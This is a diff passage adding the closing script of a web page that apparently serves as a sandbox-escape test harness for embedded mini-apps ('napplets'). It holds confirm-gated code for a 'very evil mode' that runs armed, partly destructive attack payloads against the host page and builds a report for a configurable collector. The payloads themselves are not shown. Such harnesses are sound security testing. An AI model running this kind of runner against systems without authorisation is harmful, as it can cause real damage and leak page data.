+    const last = ATTACKS.filter((a) => a.evil && a.destructive);
+    return plain.concat(last);
+  }
+  function effectiveStatus(a) {
+    const s = (state.results[a.id] || {}).status;
+    // detonation rows are armed by construction: unprobed === ready
+    return a.autoRun === false && !s ? 'ready' : s;
+  }
+  function openConfirm() {
+    const armable = planOrder().filter((a) => {
+      const s = effectiveStatus(a);
+      return s === 'armed' || s === 'sent' || s === 'ready';
+    });
+    if (!armable.length) return;
+    planList.innerHTML = '';
+    for (const a of armable) {
+      const li = document.createElement('li');
+      li.innerHTML = '<b>' + esc(a.name) + '</b> — ' + esc(a.evilBrief || a.harm);
+      planList.appendChild(li);
+    }
+    collectorInput.value = state.collector;
+    confirmInput.value = '';
+    confirmBtn.disabled = true;
+    confirmDlg.showModal();
+  }
+  collectorInput.addEventListener('input', () => { state.collector = collectorInput.value.trim() || DEFAULT_COLLECTOR; });
+  confirmInput.addEventListener('input', () => { confirmBtn.disabled = confirmInput.value !== CONFIRM_PHRASE; });
+
+  confirmBtn.addEventListener('click', async () => {
+    confirmDlg.close();
+    await executeVeryEvil();
+  });
+
+  async function executeVeryEvil() {
+    state.veryEvil = true;
+    evilPanel.hidden = false;
+    evilLog.textContent = '';
+    const logLine = (s) => {
+      evilLog.textContent += '[' + new Date().toISOString() + '] ' + s + '\n';
+      evilLog.scrollTop = evilLog.scrollHeight;
+    };
+    logLine('VERY EVIL MODE — executing armed payloads against ' + safeGet(() => location.href));
+    logLine('collector: ' + state.collector);
+    renderSummary();
+    for (const a of planOrder()) {
+      const st = effectiveStatus(a);
+      if (st !== 'armed' && st !== 'sent' && st !== 'ready') {
+        state.evilResults[a.id] = { skipped: 'not armed (' + (st || 'unprobed') + ') — runtime holds' };
+        logLine('SKIP ' + a.name + ' — not armable, the runtime holds');
+        updateReport();
+        continue;
+      }
+      logLine('RUN  ' + a.name + ' — ' + (a.evilBrief || a.harm));
+      try {
+        state.evilResults[a.id] = await a.evil();
+        logLine('DONE ' + a.name + ' → ' + JSON.stringify(state.evilResults[a.id]).slice(0, 400));
+      } catch (e) {
+        state.evilResults[a.id] = { error: errMsg(e) };
+        logLine('ERR  ' + a.name + ' → ' + errMsg(e));
+      }
+      updateReport();
+      renderSummary();
+    }
+    logLine('finished. everything above actually happened.');
+    updateReport();
+  }
+
+  /* ---------- report ---------- */
+
+  function buildReport() {
+    return {
+      napplet: window.__EVIL_ID__ || 'unknown',
+      mode: state.veryEvil ? 'VERY-EVIL' : 'demo',
+      at: new Date().toISOString(),
+      collector: state.collector,
+      location: safeGet(() => location.href),
+      origin: safeGet(() => window.origin),
+      referrer: document.referrer,
+      parentLength: safeGet(() => window.parent.length),
+      findings: ATTACKS.map((a) => Object.assign({ id: a.id, name: a.name, severity: a.severity }, state.results[a.id] || {}, { evil: state.evilResults[a.id] || null })),
+    };
+  }
+  function updateReport() {
+    reportText.value = JSON.stringify(buildReport(), null, 2);
+  }
+  document.getElementById('copyReportBtn').addEventListener('click', async () => {
+    try {
+      await navigator.clipboard.writeText(reportText.value);
+    } catch (_) {
+      reportText.select();
+    }
+  });
+  document.getElementById('reportBtn').addEventListener('click', () => {
+    const d = document.getElementById('report');
+    d.open = !d.open;
+  });
+
+  armBtn.addEventListener('click', () => { updateReport(); openConfirm(); });
+  document.getElementById('runAllBtn').addEventListener('click', () => { void runAllDemos(); });
+
+  /* ---------- boot ---------- */
+  renderKit();
+  render();
+  updateReport();
+  void runAllDemos();
+})();
+</script>
+</body>
+</html>
